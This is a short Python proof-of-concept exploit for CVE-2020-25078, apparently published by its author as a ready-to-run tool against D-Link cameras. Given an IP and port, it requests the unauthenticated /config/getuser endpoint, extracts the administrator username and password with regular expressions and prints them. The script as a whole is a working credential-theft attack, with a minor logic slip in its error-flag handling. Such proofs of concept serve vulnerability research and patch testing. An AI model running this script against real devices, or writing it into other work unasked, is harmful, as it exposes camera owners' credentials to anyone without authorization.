#!/usr/bin/python
"""
CVE: CVE-2020-25078
Author: muddlelife
There is a password leak in the D-Link series
"""
import random
import sys
import requests
import re

target_ip = "192.168.216.1"
telnet_port = 443
flag = True


def main():
    if len(sys.argv) != 3:
        print("[*] Usage: poc.py <camera IP> <port> example: poc.py 192.168.216.1 443")
        exit()
    target_ip = sys.argv[1]
    telnet_port = int(sys.argv[2])
    print("[+] Connecting to " + target_ip + "....")
    try:
        response = send_payload(target_ip, telnet_port)
        if flag:
            print("[+] Trying to get username and password")
            get_info(response)
        else:
            print("[-] Unknown error, target might not be connected or no vulnerability")
    except:
        print("[-] Unknown error, target might not be connected or no vulnerability")


def send_payload(target_ip, telnet_port):
    try:
        response = requests.get("http://" + target_ip + ":" + str(telnet_port) + "/config/getuser?index=0").text
        return response
    except:
        flag = False
        return flag


def get_info(response):
    nameReg = re.compile(r'name=(.+?\n)')
    passwdReg = re.compile(r'pass=(.+?\n)')

    name = re.findall(nameReg, response)
    passwd = re.findall(passwdReg, response)
    print("[Successfully] username=" + name[0].strip(), "password=" + passwd[0].strip())


if __name__ == '__main__':
    color = random.randint(31, 39)
    print("\033[%sm                                        _     _ _ _  __      \033[0m" % color)
    print("\033[%sm                    _ __ ___  _   _  __| | __| | (_)/ _| ___ \033[0m" % color)
    print("\033[%sm                   | '_ ` _ \| | | |/ _` |/ _` | | | |_ / _ \\\033[0m" % color)
    print("\033[%sm                   | | | | | | |_| | (_| | (_| | | |  _|  __/\033[0m" % color)
    print("\033[%sm                   |_| |_| |_|\__,_|\__,_|\__,_|_|_|_|  \___|\033[0m" % color)
    main()
